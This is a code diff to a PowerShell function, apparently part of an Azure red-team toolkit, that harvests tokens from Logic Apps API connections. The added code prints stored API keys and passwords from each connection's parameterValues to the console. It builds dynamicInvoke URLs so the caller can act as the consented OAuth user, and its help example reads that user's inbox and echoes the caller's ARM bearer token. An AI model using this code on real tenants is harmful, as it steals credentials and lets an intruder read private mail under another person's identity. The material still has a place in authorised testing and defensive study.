@@ -281,6 +281,7 @@ function Get-ApiConnectionToken {
             Attempted    = 0
             Succeeded    = 0
             SkippedMI    = 0
+            SkippedOAuth = 0
             Failed       = 0
             Unauthorized = 0
         }
@@ -336,8 +337,13 @@ function Get-ApiConnectionToken {
 
             foreach ($connId in $targets) {
                 try {
-                    $sv   = $script:SessionVariables
-                    $auth = $script:authHeader
+                    $sv          = $script:SessionVariables
+                    $auth        = $script:authHeader
+                    # Initialise catch-visible state in case GET fails
+                    $isOAuthUser = $false
+                    $dynUrl      = $null
+                    $storedCreds = $null
+                    $credCount   = 0
 
                     # Step 1: GET connection to retrieve metadata
                     # and the connection runtime URL
@@ -402,6 +408,31 @@ function Get-ApiConnectionToken {
                         $stats.SkippedMI++
                         continue
                     }
+
+                    # Pre-compute flags and the dynamicInvoke URL.
+                    # These are available in both the success path and
+                    # the catch block below.
+                    # OAuth-User connections will throw when
+                    # listConnectionKeys is called — expected, because
+                    # the refresh token lives in Azure's internal vault.
+                    # The catch handler surfaces DynamicInvokeUrl so
+                    # Invoke-ConnectorProxy can still act as this user.
+                    $isOAuthUser = [bool]$props.authenticatedUser.name
+                    $authUser    = $props.authenticatedUser.name
+                    $storedCreds = $props.parameterValues
+                    $credCount   = if ($storedCreds) {
+                        $storedCreds.PSObject.Properties.Name.Count
+                    } else { 0 }
+
+                    $dynSub = ($connId -split '/')[2]
+                    $dynRg  = ($connId -split '/')[4]
+                    $dynUrl = (
+                        '{0}/subscriptions/{1}' +
+                        '/resourceGroups/{2}' +
+                        '/providers/Microsoft.Web' +
+                        '/connections/{3}/dynamicInvoke' +
+                        '?api-version=2018-07-01-preview'
+                    ) -f $sv.armUri, $dynSub, $dynRg, $connectionName
 
                     # Step 2: POST listConnectionKeys to retrieve
                     # a short-lived JWT for the connection runtime.
@@ -482,19 +513,21 @@ function Get-ApiConnectionToken {
                     else { $null }
 
                     $item = [PSCustomObject]@{
-                        'ConnectionName'   = $connectionName
-                        'ConnectorId'      = $connectorId
-                        'ConnectorDisplay' = $connectorName
-                        'AuthorizedAs'     = $authorizedAs
-                        'ConnectionStatus' = (
+                        'ConnectionName'    = $connectionName
+                        'ConnectorId'       = $connectorId
+                        'ConnectorDisplay'  = $connectorName
+                        'AuthorizedAs'      = $authorizedAs
+                        'ConnectionStatus'  = (
                             $props.statuses |
                             Select-Object -First 1 -ExpandProperty status
                         )
-                        'RuntimeUrl'       = $runtimeUrl
-                        'Token'            = $token
-                        'NotAfter'         = $notAfter
-                        'ResourceId'       = $connId
-                        'ResourceGroup'    = ($connId -split '/')[4]
+                        'RuntimeUrl'        = $runtimeUrl
+                        'Token'             = $token
+                        'NotAfter'          = $notAfter
+                        'StoredCredentials' = $storedCreds
+                        'DynamicInvokeUrl'  = $dynUrl
+                        'ResourceId'        = $connId
+                        'ResourceGroup'     = ($connId -split '/')[4]
                     }
 
                     [void]$result.Add($item)
@@ -505,12 +538,79 @@ function Get-ApiConnectionToken {
                         "($connectorId) — token retrieved"
                     ) -ForegroundColor Green
 
+                    if ($credCount -gt 0) {
+                        Write-Host (
+                            "      Stored credentials found:"
+                        ) -ForegroundColor Red
+                        foreach ($p in (
+                            $storedCreds.PSObject.Properties
+                        )) {
+                            Write-Host (
+                                "        $($p.Name): $($p.Value)"
+                            ) -ForegroundColor Red
+                        }
+                    }
+
                     if ($runtimeUrl) {
                         Write-Host "      Runtime URL: $runtimeUrl" `
                             -ForegroundColor Cyan
                     }
                 }
                 catch {
+                    # OAuth-User: listConnectionKeys is blocked by
+                    # Azure — the refresh token lives in an internal
+                    # vault. DynamicInvokeUrl (via Invoke-ConnectorProxy)
+                    # proxies connector actions as this user without
+                    # needing the raw OAuth token.
+                    if ($isOAuthUser) {
+                        Write-Host (
+                            "  [~] $connectionName ($connectorId)" +
+                            " — OAuth-User ($authUser)" +
+                            ' — use Invoke-ConnectorProxy'
+                        ) -ForegroundColor Yellow
+
+                        if ($credCount -gt 0) {
+                            Write-Host (
+                                '      Stored credentials in ' +
+                                'parameterValues:'
+                            ) -ForegroundColor Red
+                            foreach ($p in (
+                                $storedCreds.PSObject.Properties
+                            )) {
+                                Write-Host (
+                                    "        $($p.Name): $($p.Value)"
+                                ) -ForegroundColor Red
+                            }
+                        }
+
+                        if ($dynUrl) {
+                            Write-Host (
+                                "      DynamicInvokeUrl: $dynUrl"
+                            ) -ForegroundColor Cyan
+                        }
+
+                        [void]$result.Add([PSCustomObject]@{
+                            'ConnectionName'    = $connectionName
+                            'ConnectorId'       = $connectorId
+                            'ConnectorDisplay'  = $connectorName
+                            'AuthorizedAs'      = $authUser
+                            'ConnectionStatus'  = (
+                                $props.statuses |
+                                Select-Object -First 1 `
+                                    -ExpandProperty status
+                            )
+                            'RuntimeUrl'        = $runtimeUrl
+                            'Token'             = $null
+                            'NotAfter'          = $null
+                            'StoredCredentials' = $storedCreds
+                            'DynamicInvokeUrl'  = $dynUrl
+                            'ResourceId'        = $connId
+                            'ResourceGroup'     = ($connId -split '/')[4]
+                        })
+                        $stats.SkippedOAuth++
+                        continue
+                    }
+
                     $errMsg = $_.Exception.Message
                     # $_.ErrorDetails.Message contains the Azure
                     # error JSON body (more informative than the
@@ -578,6 +678,10 @@ function Get-ApiConnectionToken {
             -ForegroundColor Red
         Write-Host "   Skipped (MI) : $($stats.SkippedMI)" `
             -ForegroundColor Yellow
+        Write-Host (
+            "   Skipped (OAuth-User): " +
+            "$($stats.SkippedOAuth)"
+        ) -ForegroundColor Yellow
         Write-Host (
             "   Duration     : " +
             "$($duration.TotalSeconds.ToString('F2'))s"
@@ -687,7 +791,54 @@ function Get-ApiConnectionToken {
 
         Exports all retrievable token metadata to a timestamped JSON file.
 
-    .OUTPUTS
+    .EXAMPLE
+        # OAuth-User connections (e.g. office365, sharepointonline,
+        # teams) store the OAuth refresh token in Azure's internal
+        # Logic Apps token vault. It is NOT accessible via any ARM
+        # API — parameterValues will be empty for these connectors.
+        #
+        # API Key and Basic Auth connections DO store their credential
+        # in parameterValues — readable from the GET response.
+        #
+        # For OAuth-User: Get-ApiConnectionToken surfaces the
+        # dynamicInvoke URL, which lets you proxy connector API calls
+        # *as the consented user* (requires Join/action on the
+        # connection — held by Contributor and above):
+
+        $conn = Get-ApiConnectionToken -Name 'office365' `
+            -ResourceGroupName 'azh-development'
+
+        # StoredCredentials will be empty for pure OAuth connections.
+        # For API Key/Basic Auth connections it will hold the secret:
+        $conn.StoredCredentials
+
+        # To act as the OAuth user without the token, use ARM as
+        # the caller identity and proxy through dynamicInvoke:
+        $armToken = (Get-AzAccessToken `
+            -ResourceUrl 'https://management.azure.com/').Token
+        Write-Host "ARM caller token: $armToken"
+
+        $authHeader = @{ Authorization = "Bearer $armToken" }
+
+        # List the inbox of the consented user (office365 connector
+        # path — see connector swagger for available paths):
+        $body = @{
+            method  = 'get'
+            path    = '/v2/Mail'
+            queries = @{ fetchOnlyUnread = $false; top = 10 }
+        } | ConvertTo-Json -Depth 5
+
+        Invoke-RestMethod `
+            -Uri         $conn.DynamicInvokeUrl `
+            -Method      POST `
+            -Headers     $authHeader `
+            -Body        $body `
+            -ContentType 'application/json'
+
+        # Azure proxies the call using the stored OAuth token on
+        # behalf of the authorised user — the OAuth refresh token
+        # itself remains in Azure's vault and is never exposed.
+
         [PSCustomObject]
         Each object contains:
         - ConnectionName: Resource name of the connection
@@ -696,8 +847,15 @@ function Get-ApiConnectionToken {
         - AuthorizedAs: Identity that originally consented
         - ConnectionStatus: Connected | Error | Unauthenticated
         - RuntimeUrl: Connection runtime URL (call target)
-        - Token: Short-lived JWT for the runtime service
+        - Token: Short-lived JWT (null for MI/OAuth-User connections)
         - NotAfter: Token expiry (ISO 8601)
+        - StoredCredentials: Contents of parameterValues from ARM;
+          populated for API Key and Basic Auth connections;
+          empty for OAuth-User (token held in Azure vault)
+        - DynamicInvokeUrl: ARM proxy endpoint for OAuth-User
+          connections (present only for OAuth-User type)
+        - MIAnalysis: Chain analysis report (present only with
+          -ResolveManagedIdentity on MI connections)
         - ResourceId: Full ARM resource ID
         - ResourceGroup: Containing resource group
 
